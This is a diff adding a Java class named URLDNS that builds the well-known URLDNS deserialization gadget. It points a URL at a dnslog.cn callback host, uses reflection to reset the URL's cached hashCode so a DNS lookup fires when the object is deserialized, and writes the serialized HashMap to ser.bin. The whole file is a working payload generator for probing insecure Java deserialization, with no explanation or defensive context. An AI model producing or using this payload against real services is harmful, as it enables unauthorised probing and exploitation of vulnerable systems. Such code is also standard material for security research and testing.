@@ -1,0 +1,36 @@
+package org.example;
+
+import java.io.IOException;
+import java.lang.reflect.Field;
+import java.net.URL;
+import java.util.HashMap;
+
+public class URLDNS {
+    public static void main(String[] args) throws Exception {
+        URL url = new URL("http://2.1s62mt.dnslog.cn");
+//        url.hashCode();
+        HashMap<Object, Object> map = new HashMap<>();
+        Field hashCode = url.getClass().getDeclaredField("hashCode");
+        hashCode.setAccessible(true);
+        hashCode.set(url,0);
+        map.put(url,"godown");
+        hashCode.set(url,-1);
+        serialize(map);
+//        unserialize("ser.bin");
+    }
+    public static void serialize(Object obj) throws Exception
+    {
+        java.io.FileOutputStream fos = new java.io.FileOutputStream("ser.bin");
+        java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream(fos);
+        oos.writeObject(obj);
+        oos.close();
+    }
+    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException
+    {
+        java.io.FileInputStream fis = new java.io.FileInputStream(Filename);
+        java.io.ObjectInputStream ois = new java.io.ObjectInputStream(fis);
+        Object obj = ois.readObject();
+        ois.close();
+        return obj;
+    }
+}
